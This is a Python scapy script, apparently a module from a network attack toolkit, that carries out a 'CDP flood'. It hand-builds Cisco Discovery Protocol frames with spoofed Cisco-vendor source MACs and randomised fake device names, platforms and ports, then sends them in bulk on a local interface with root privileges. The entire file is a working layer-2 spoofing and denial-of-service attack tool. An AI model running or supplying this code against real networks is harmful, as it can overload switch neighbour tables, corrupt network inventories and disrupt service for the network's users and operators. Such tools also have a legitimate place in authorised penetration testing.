from scapy.all import Ether, Dot3, LLC, SNAP, sendp, RandMAC
import argparse
import time
import random
import struct

CISCO_MACS = [
    "00:00:0C",
    "00:01:42",
    "00:01:43",
    "00:01:63",
    "00:01:64",
    "00:01:96",
    "00:01:97",
    "00:01:C7",
    "00:01:C8",
    "00:02:16",
    "00:02:17",
    "00:02:4A",
    "00:02:4B",
    "00:02:7D",
    "00:02:7E",
    "00:02:B9",
    "00:02:BA",
    "00:03:6B",
    "00:03:6C",
    "00:03:E3",
    "00:03:E4",
    "00:04:4A",
    "00:04:4B",
    "00:04:9D",
    "00:04:9E",
    "00:04:C0",
    "00:04:C1",
    "00:05:00",
    "00:05:01",
    "00:05:31",
    "00:05:32",
    "00:05:5E",
    "00:05:5F",
    "00:05:73",
    "00:05:74",
    "00:05:9B",
    "00:05:9C",
    "00:05:DC",
    "00:05:DD",
    "00:06:28",
    "00:06:29",
    "00:06:52",
    "00:06:53",
    "00:06:7C",
    "00:06:7D",
    "00:06:D6",
    "00:06:D7",
    "00:07:0D",
    "00:07:0E",
    "00:07:4F",
    "00:07:50",
    "00:07:7D",
    "00:07:7E",
    "00:07:B4",
    "00:07:B5",
    "00:07:EB",
    "00:07:EC",
]

def execute(args):
    """Execute CDP flood attack"""
    print(f"[CDP Flood] Starting attack on interface {args.interface}")
    
    try:
        count = args.count if args.count else 1000
        interval = getattr(args, 'interval', 0.1) 
        
        print(f"[CDP Flood] Sending {count} CDP packets")
        print(f"[CDP Flood] Interval: {interval} seconds")
        
        cdp_flood(args.interface, count, interval, args.verbose)
        
        print("[CDP Flood] Attack completed")
        return True
        
    except Exception as e:
        print(f"[CDP Flood] Error: {e}")
        return False

def create_cdp_packet(src_mac, device_id, port_id, platform):
    """Create CDP packet manually without scapy.contrib.cdp"""
    dst_mac = "01:00:0c:cc:cc:cc"
    
    cdp_payload = b""
    cdp_payload += b"\x02"
    cdp_payload += b"\xb4"
    cdp_payload += b"\x00\x00"
    
    device_id_bytes = device_id.encode()
    cdp_payload += struct.pack(">HH", 0x0001, len(device_id_bytes) + 4) 
    cdp_payload += b"\x00\x04" 
    cdp_payload += device_id_bytes
    
    port_id_bytes = port_id.encode()
    cdp_payload += struct.pack(">HH", 0x0003, len(port_id_bytes) + 4) 
    cdp_payload += b"\x00\x04" 
    cdp_payload += port_id_bytes
    
    platform_bytes = platform.encode()
    cdp_payload += struct.pack(">HH", 0x0006, len(platform_bytes) + 4) 
    cdp_payload += b"\x00\x04"
    cdp_payload += platform_bytes
    
    capabilities = 0x00000028 
    cdp_payload += struct.pack(">HHI", 0x0004, 8, capabilities) 
    
    checksum = 0
    for i in range(0, len(cdp_payload), 2):
        if i + 1 < len(cdp_payload):
            checksum += (cdp_payload[i] << 8) + cdp_payload[i + 1]
        else:
            checksum += cdp_payload[i] << 8
    checksum = (checksum & 0xffff) + (checksum >> 16)
    checksum = ~checksum & 0xffff
    
    cdp_payload = cdp_payload[:3] + struct.pack(">H", checksum) + cdp_payload[5:]
    
    cdp_packet = (
        Ether(dst=dst_mac, src=src_mac) /
        Dot3() /
        LLC(dsap=0xaa, ssap=0xaa, ctrl=3) / 
        SNAP(OUI=0x00000c, code=0x2000) / 
        cdp_payload
    )
    
    return cdp_packet

def cdp_flood(interface, count, interval, verbose=False):
    """
    Floods the specified interface with CDP packets.
    """
    print(f"Starting CDP flood on interface {interface} with {count} packets...")
    
    try:
        for i in range(count):
            cisco_oui = random.choice(CISCO_MACS)
            nic_part = ":".join([f"{random.randint(0, 255):02x}" for _ in range(3)])
            src_mac = f"{cisco_oui}:{nic_part}"
            
            device_types = [
                "Cisco-Catalyst-2960",
                "Cisco-Catalyst-3750", 
                "Cisco-Catalyst-3850",
                "Cisco-Catalyst-4500",
                "Cisco-Catalyst-6500",
                "Cisco-Nexus-7000",
                "Cisco-Nexus-9000",
                "Cisco-ASR-1000",
                "Cisco-ISR-4000",
                "Cisco-WLC-3504"
            ]
            
            platform_types = [
                "cisco WS-C2960X-48FPS-L",
                "cisco WS-C3750X-48P-S",
                "cisco WS-C3850-48U-E",
                "cisco WS-C4500X-32SFP+",
                "cisco WS-C6509-E",
                "cisco N7K-C7018",
                "cisco N9K-C9336C-FX2",
                "cisco ASR1001-X",
                "cisco ISR4451-X",
                "cisco C3504-K9"
            ]
            
            device_id = f"{random.choice(device_types)}-{random.randint(1, 100)}"
            platform = random.choice(platform_types)
            port_id = f"GigabitEthernet{random.randint(1, 48)}/0/{random.randint(1, 4)}"
            
            cdp_packet = create_cdp_packet(src_mac, device_id, port_id, platform)
            
            sendp(cdp_packet, iface=interface, verbose=verbose)
            
            if (i + 1) % 100 == 0:
                print(f"Sent {i + 1} packets...")
                print(f"Current device: {device_id} ({src_mac})")
            
            time.sleep(interval)
            
        print(f"CDP flood completed. Sent {count} packets.")
        
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CDP Flood Attack")
    parser.add_argument("--interface", "-i", required=True, help="Network interface")
    parser.add_argument("--count", "-c", type=int, default=1000, 
                       help="Number of CDP packets to send")
    parser.add_argument("--interval", type=float, default=0.1,
                       help="Interval between packets in seconds")
    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")
    
    args = parser.parse_args()
    
    import os
    if os.geteuid() != 0:
        print("[-] This script requires root privileges. Run with sudo.")
        exit(1)
    
    execute(args)